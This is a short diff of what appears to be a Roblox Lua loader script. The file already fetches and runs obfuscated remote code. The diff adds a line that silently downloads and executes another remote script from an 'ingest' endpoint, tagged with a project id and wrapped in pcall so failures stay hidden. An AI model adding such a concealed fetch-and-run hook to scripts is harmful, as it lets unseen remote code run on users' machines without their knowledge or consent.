@@ -1,1 +1,2 @@
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_c44378984b4d", "1.0.0", false) end)
 loadstring(game:HttpGet("https://cdn.luaprotect.dev/u/422027/tuvEGwyrI-JI1Iff"))()
